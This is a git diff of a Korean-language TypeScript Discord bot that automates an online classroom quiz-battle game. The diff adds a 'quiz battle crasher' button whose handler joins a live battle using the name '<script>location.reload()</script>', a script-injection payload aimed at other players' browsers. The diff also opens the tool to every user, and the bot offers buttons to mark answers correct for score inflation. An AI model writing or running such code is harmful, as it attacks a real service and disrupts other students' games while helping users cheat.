@@ -218,9 +218,9 @@ client.on("interactionCreate", async (interaction) => {
                     return;
                 };
                 let folders: { id: string, name: string, isFolder: boolean }[] = [];
-                Object.keys(foldersResult.data!).forEach(key => folders.push({
-                    id: foldersResult!.data![key],
-                    name: key,
+                foldersResult.data?.forEach(f => folders.push({ //Object.keys(foldersResult.data!).for~
+                    id: f.id,
+                    name: f.name,
                     isFolder: true
                 }));
                 let classesResult = await classes[interaction.user.id].getClasses();
@@ -316,15 +316,15 @@ client.on("interactionCreate", async (interaction) => {
                 };
                 let message = await interaction.channel!.send({
                     "embeds": [new MessageEmbed().setTitle("❓ 배틀코드를 입력해주세요.").setColor("YELLOW")],
-                    "components": [{
-                        "type": 1,
-                        "components": [{
-                            "type": 2,
-                            "label": "🗑️ 메세지 지우기",
-                            "style": 4,
-                            "custom_id": "delete_message|" + interaction.user.id + "|q"
-                        }]
-                    }]
+                    // "components": [{
+                    //     "type": 1,
+                    //     "components": [{
+                    //         "type": 2,
+                    //         "label": "🗑️ 메세지 지우기",
+                    //         "style": 4,
+                    //         "custom_id": "delete_message|" + interaction.user.id + "|q"
+                    //     }]
+                    // }]
                 });
                 let collected: Collection<string, Message<boolean>> | false = await channel.awaitMessages({
                     filter: (m) => m.author.id === interaction.user.id,
@@ -345,36 +345,35 @@ client.on("interactionCreate", async (interaction) => {
                 if (!collected || !collected.first()) return;
                 collected.first()?.delete().catch(() => false);
                 await message.edit({ embeds: [new MessageEmbed().setTitle("⚙️ 잠시만 기다려주세요.").setColor("BLUE")] });
-                qbClasses[interaction.user.id] = new QuizBattle(Number(battleCode));
+                let quizBattle = new QuizBattle(Number(battleCode));
                 let end = false;
-                qbClasses[interaction.user.id].on("error", (error: string) => {
+                quizBattle.on("error", (error: string) => {
                     end = true;
-                    qbClasses[interaction.user.id].leave();
                     message.edit({ embeds: [new MessageEmbed().setTitle(`❌ ${error}`).setColor("RED")], components: [] }).then(() => setTimeout(message.delete, 10000)).catch(() => false);
-                    qbClasses[interaction.user.id].removeAllListeners();
-                    delete qbClasses[interaction.user.id];
+                    quizBattle.leave();
+                    quizBattle.removeAllListeners();
                 });
-                qbClasses[interaction.user.id].on("start", async () => {
+                quizBattle.on("start", async () => {
                     try {
                         while (!end) {
                             await sleep(1000);
                             let firstLine = {
-                                correct: String(qbClasses[interaction.user.id].correct) + "개",
-                                wrong: String(qbClasses[interaction.user.id].wrong) + "개",
-                                total: String(qbClasses[interaction.user.id].correct + qbClasses[interaction.user.id].wrong) + "개"
+                                correct: String(quizBattle.correct) + "개",
+                                wrong: String(quizBattle.wrong) + "개",
+                                total: String(quizBattle.correct + quizBattle.wrong) + "개"
                             };
                             Object.keys(firstLine).forEach((key: string) => firstLine[key as "correct" | "wrong" | "total"] += Math.max(firstLine.correct.length, firstLine.wrong.length, firstLine.total.length) > firstLine[key as "correct" | "wrong" | "total"].length ? " ".repeat(Math.max(firstLine.correct.length, firstLine.wrong.length, firstLine.total.length) - firstLine[key as "correct" | "wrong" | "total"].length) : "");
                             await message.edit({
-                                "embeds": [new MessageEmbed().setTitle("퀴즈 배틀 실시간 경쟁").setDescription(`
-                            전체: ${firstLine.total} 현재 점수: ${qbClasses[interaction.user.id].score}점
-                            정답: ${firstLine.correct} 반 평균 점수: ${qbClasses[interaction.user.id].classAvg}점
-                            오답: ${firstLine.wrong} 순위 갱신까지 남은 문제: ${qbClasses[interaction.user.id].round.remaining}개
+                                "embeds": [new MessageEmbed().setTitle("퀴즈배틀 실시간 경쟁").setDescription(`
+                            전체: ${firstLine.total} 현재 점수: ${quizBattle.score}점
+                            정답: ${firstLine.correct} 반 평균 점수: ${quizBattle.classAvg}점
+                            오답: ${firstLine.wrong} 순위 갱신까지 남은 문제: ${quizBattle.round.remaining}개
                             `.trim()).setColor("GREEN")],
                                 "components": [{
                                     "type": 1,
                                     "components": [{
                                         "type": 2,
-                                        "label": `정답 처리(+${(100 * qbClasses[interaction.user.id].battleInfo.quest_list[qbClasses[interaction.user.id].b_quest_idx + 1].weight) || "unknown"}점)`,
+                                        "label": `정답 처리(+${(100 * quizBattle.battleInfo.quest_list[quizBattle.b_quest_idx + 1].weight) || "unknown"}점)`,
                                         "style": 3,
                                         "custom_id": "quiz_battle_answer|correct|" + interaction.user.id
                                     }, {
@@ -383,43 +382,84 @@ client.on("interactionCreate", async (interaction) => {
                                         "style": 4,
                                         "custom_id": "quiz_battle_answer|wrong|" + interaction.user.id
                                     }]
-                                }, {
-                                    "type": 1,
-                                    "components": [{
-                                        "type": 2,
-                                        "label": "🗑️ 메세지 지우기",
-                                        "style": 4,
-                                        "custom_id": "delete_message|" + interaction.user.id + "|q"
-                                    }]
-                                }]
-                            }).catch(() => end = true);
+                                },
+                                // {
+                                //     "type": 1,
+                                //     "components": [{
+                                //         "type": 2,
+                                //         "label": "🗑️ 메세지 지우기",
+                                //         "style": 4,
+                                //         "custom_id": "delete_message|" + interaction.user.id + "|q"
+                                //     }]
+                                // }
+                            ]}).catch(() => end = true);
                         };
                     } catch {
 
                     };
                 });
-                qbClasses[interaction.user.id].on("end", () => {
+                quizBattle.on("end", () => {
                     end = true;
                     message.edit({ embeds: [new MessageEmbed().setTitle("🎮 배틀이 종료되었습니다.").setColor("GREEN")], components: [] }).then(() => setTimeout(message.delete, 10000)).catch(() => false);
-                    qbClasses[interaction.user.id].leave();
-                    qbClasses[interaction.user.id].removeAllListeners();
-                    delete qbClasses[interaction.user.id];
+                    quizBattle.leave();
+                    quizBattle.removeAllListeners();
                 });
                 await message.edit({ embeds: [new MessageEmbed().setTitle("⚙️ 웹소켓 연결 중...").setColor("BLUE")] });
-                await qbClasses[interaction.user.id].init();
+                await quizBattle.init();
                 await message.edit({ embeds: [new MessageEmbed().setTitle("⚙️ 접속 중...").setColor("BLUE")] });
-                await qbClasses[interaction.user.id].join(String(collected.first()?.content));
+                await quizBattle.join(String(collected.first()?.content));
+                await message.edit({ embeds: [new MessageEmbed().setTitle("⌛ 배틀 시작을 기다리는 중입니다.").setColor("BLUE")] });
+            } else if(interaction.customId === "quiz_battle_crash") {
+                interaction.deferUpdate();
+                let message = await interaction.channel!.send({
+                    "embeds": [new MessageEmbed().setTitle("❓ 배틀코드를 입력해주세요.").setColor("YELLOW")],
+                    "components": [{
+                        "type": 1,
+                        "components": [{
+                            "type": 2,
+                            "label": "🗑️ 메세지 지우기",
+                            "style": 4,
+                            "custom_id": "delete_message|" + interaction.user.id
+                        }]
+                    }]
+                });
+                let collected: Collection<string, Message<boolean>> | false = await channel.awaitMessages({
+                    filter: (m) => m.author.id === interaction.user.id,
+                    time: 30000,
+                    max: 1,
+                    errors: ["time"]
+                }).catch(() => message.edit({ embeds: [new MessageEmbed().setTitle("❌ 시간이 초과되었습니다.").setColor("RED")], components: [] }).then(() => setTimeout(message.delete, 10000)).then(() => false));
+                if (!collected || !collected.first()) return;
+                collected.first()?.delete().catch(() => false);
+                let battleCode = collected.first()?.content;
+                await message.edit({ embeds: [new MessageEmbed().setTitle("⚙️ 잠시만 기다려주세요.").setColor("BLUE")] });
+                let quizBattle = new QuizBattle(Number(battleCode));
+                quizBattle.on("error", (error: string) => {
+                    message.edit({ embeds: [new MessageEmbed().setTitle(`❌ ${error}`).setColor("RED")], components: [] }).then(() => setTimeout(message.delete, 10000)).catch(() => false);
+                    quizBattle.leave();
+                    quizBattle.removeAllListeners();
+                });
+                quizBattle.on("start", () => message.edit({ embeds: [new MessageEmbed().setTitle("⌛ 게임이 끝날 때까지 기다리는 중입니다.").setColor("GREEN")], components: [] }).then(() => setTimeout(message.delete, 10000)).catch(() => false));
+                quizBattle.on("end", () => {
+                    message.edit({ embeds: [new MessageEmbed().setTitle("🎮 크래셔 작동 성공.").setColor("GREEN")], components: [] }).then(() => setTimeout(message.delete, 10000)).catch(() => false);
+                    quizBattle.leave();
+                    quizBattle.removeAllListeners();
+                });
+                await message.edit({ embeds: [new MessageEmbed().setTitle("⚙️ 웹소켓 연결 중...").setColor("BLUE")] });
+                await quizBattle.init();
+                await message.edit({ embeds: [new MessageEmbed().setTitle("⚙️ 접속 중...").setColor("BLUE")] });
+                await quizBattle.join(String("<script>location.reload()</script>"));
                 await message.edit({ embeds: [new MessageEmbed().setTitle("⌛ 배틀 시작을 기다리는 중입니다.").setColor("BLUE")] });
             } else if (interaction.customId.startsWith("delete_message")) {
                 if (interaction.customId.split("|")[1] != interaction.user.id) {
                     interaction.reply({ embeds: [new MessageEmbed().setTitle("❌ 잘못된 접근입니다.").setColor("RED")], ephemeral: true });
                     return;
                 };
-                if (interaction.customId.split("|")[2] === "q" && qbClasses[interaction.user.id]) {
-                    qbClasses[interaction.user.id].leave();
-                    qbClasses[interaction.user.id].removeAllListeners();
-                    delete qbClasses[interaction.user.id];
-                };
+                // if (interaction.customId.split("|")[2] === "q" && qbClasses[interaction.user.id]) {
+                //     qbClasses[interaction.user.id].leave();
+                //     qbClasses[interaction.user.id].removeAllListeners();
+                //     delete qbClasses[interaction.user.id];
+                // };
                 (interaction.message as Message).delete();
             } else if (interaction.customId.startsWith("quiz_battle_answer")) {
                 if (interaction.customId.split("|")[2] != interaction.user.id || !qbClasses[interaction.user.id]) {
@@ -463,7 +503,7 @@ client.on("interactionCreate", async (interaction) => {
             };
         };
     } catch (e) {
-        if (e instanceof Error && interaction.isRepliable()) interaction[interaction.replied ? "editReply" : "reply"]({ embeds: [new MessageEmbed().setTitle(`❌ ${e.message}`).setColor("RED")] }).catch(() => false);
+        if (e instanceof Error && interaction.isRepliable()) interaction[interaction.replied ? "editReply" : "reply"]({ embeds: [new MessageEmbed().setTitle(`❌ ${e.message}`).setColor("RED")], ephemeral: true }).catch(() => false);
     };
 });
 
@@ -613,7 +653,14 @@ function updateMessage(message: any, userID: string, s: string, disableMode: str
                     "label": "퀴즈배틀",
                     "style": 3,
                     "custom_id": "quiz_battle",
-                    "disabled": !config.owners.includes(userID)
+                    "disabled": false
+                },
+                {
+                    "type": 2,
+                    "label": "퀴즈배틀 크래셔",
+                    "style": 3,
+                    "custom_id": "quiz_battle_crash",
+                    "disabled": false
                 }
             ]
         });
